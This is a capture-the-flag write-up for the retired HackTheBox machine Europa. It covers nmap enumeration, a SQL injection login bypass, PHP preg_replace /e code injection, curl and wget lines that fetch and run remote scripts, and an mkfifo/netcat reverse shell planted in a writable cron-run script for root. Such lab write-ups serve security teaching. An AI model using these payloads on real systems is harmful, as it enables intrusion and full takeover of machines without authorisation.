# Europa

This is the write-up for the box Europa that got retired at the 2nd December 2017.
My IP address was 10.10.14.28 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.22    europa.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/europa.nmap 10.10.10.22
```

```markdown
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Putting _www.europacorp.htb_ and _admin-portal.europacorp.htb_ into the hosts file.

## Checking HTTP and HTTPS (Port 80 & 443)

When browsing to the web page on HTTP and HTTP with the IP address, the websites only have the default Apache2 installation page.
Checking the SSL certificate we get a potential email address _admin@europacorp.htb_ and the DNS subdomains that Nmap found.

Browsing to the sites on HTTP and HTTPS with the hostname _europacorp.htb_ it still shows the default Apache2 installation page.
The site _admin-portal.europacorp.htb_ on HTTPS shows a login page.

![Login Page](https://kyuu-ji.github.io/htb-write-up/europa/europa_login.png)

When typing in an email address it filters for symbols, so lets try a simple **SQL Injection**:
```markdown
email=admin%40europacorp.htb'-- -&password=test123
```

This gets us logged in on the page and now we see some kind of dashboard:

![Dashboard after login](https://kyuu-ji.github.io/htb-write-up/europa/europa_dashboard.png)

All buttons and links do nothing, except for **Tools** on the left side menu that forwards to some **OpenVPN Config Generator**:

![Tools Page](https://kyuu-ji.github.io/htb-write-up/europa/europa_tools.png)

Any string that gets typed into the input field replaces the _"remote-addres":"ip_address"_ with that input.
The request looks like this:
```markdown
pattern=/ip_address/&ipaddress=tester&text="openvpn": {
        "vtun0": {
                "local-address": {
                        "10.10.10.1": "''"
                },
                "local-port": "1337",
                "mode": "site-to-site",
                "openvpn-option": [
                        "--comp-lzo",
                        "--float",
                        "--ping 10",
                        "--ping-restart 20",
                        "--ping-timer-rem",
                        "--persist-tun",
                        "--persist-key",
                        "--user nobody",
                        "--group nogroup"
                ],
                "remote-address": "ip_address",
                "remote-port": "1337",
                "shared-secret-key-file": "/config/auth/secret"
        },
        "protocols": {
                "static": {
                        "interface-route": {
                                "ip_address/24": {
                                        "next-hop-interface": {
                                                "vtun0": "''"
                                        }
                                }
                        }
                }
        }
}
```

Trying to replace the _pattern=/ip_address/_ with _pattern=/vtun0/_, injection of strings in different parts of the configuration is possible.
We can guess that these slashes are for **regular expressions** and those are created in PHP with the [preg_replace()](https://www.php.net/manual/en/function.preg-replace.php) function.

This function can be used to execute code on the system by adding an **/e** after the pattern and then call the PHP code:
```markdown
pattern=/ip_address/e&ipaddress=system('whoami;')&text="openvpn": {
(...)
```

This pattern executes `whoami` with the result _www-data_ and we got code execution.

### Starting a Reverse Shell

We can upload any PHP reverse shell by starting a web server and sending a `curl` command to our local machine:
```markdown
pattern=/ip_address/e&ipaddress=system('curl http://10.10.14.28/php-reverse-shell.php | php')&text="openvpn": {
(...)
```

Sending this request starts a reverse shell on our listener as _www-data_.

## Privilege Escalation

To get an attack surface it would be useful to start any Linux enumeration script on the box:
```markdown
wget http://10.10.14.28/LinEnum.sh | bash
```

One of the **Cronjobs** is not default and executes the script _/var/www/cronjobs/clearlogs_ every minute which looks like this:
```php
#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
```

The **logcleared.sh** file does not exist but the folder **/var/www/cmd/** is owned by the group _www-data_ and has write permission for it.
So we create this particular file with a command for a reverse shell and make it executable:
```markdown
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 9002 >/tmp/f

chmod +x logcleared.sh
```

After a minute the listener on my IP and port 9002 starts a reverse shell as root!
